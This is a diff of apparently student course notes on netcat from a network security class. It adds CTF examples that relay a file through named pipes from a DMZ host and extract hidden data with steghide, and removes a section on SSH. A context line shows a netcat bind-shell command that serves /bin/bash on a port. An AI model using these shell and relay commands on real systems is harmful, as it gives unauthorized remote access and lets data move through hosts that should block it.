@@ -120,27 +120,14 @@ Then listen for the shell.
 You can also listen using the -e with NETCAT.  
 ```nc -l -p <any unfiltered port> -e /bin/bash```  
 
+ctfd examples:  
+student@internet-host-student-18:~$ nc -lvp 5678 > 2steg.jpg  
+student@blue-int-dmz-host-1-student-18:~$ nc -lvp 4321 0<pipe | nc 10.50.43.237 5678  1>pipe  
+student@internet-host-student-18:~$ steghide extract -sf 2steg.jpg   
 
 
-
-
-SSH
-Various Implementations (v1 and v2)
-
-Provides authentication, encryption, and integrity.
-
-Allows remote terminal sessions
-
-Used for tunneling
-
-Created as a secure replacement for Berkeley Remote commands:
-
-rsh - replaced with ssh, provides a channel for running a shell on a remote computer.
-
-rlogin - replaced with rlogin, provides remote login capability.
-
-rcp - replaced with scp for secure file transfer
-
-sftp (not a unix r command replacement) - creates remote directory listing and file transfer capability over SSH
+student@internet-host-student-18:~$ nc -lvp 5678 > 4steg.jpg  
+student@blue-int-dmz-host-1-student-18:~$ nc 172.16.82.115 9876 0<pipe | nc 10.50.43.237 5678 1>pipe  
+student@internet-host-student-18:~$ steghide extract -sf 4steg.jpg   
 
 
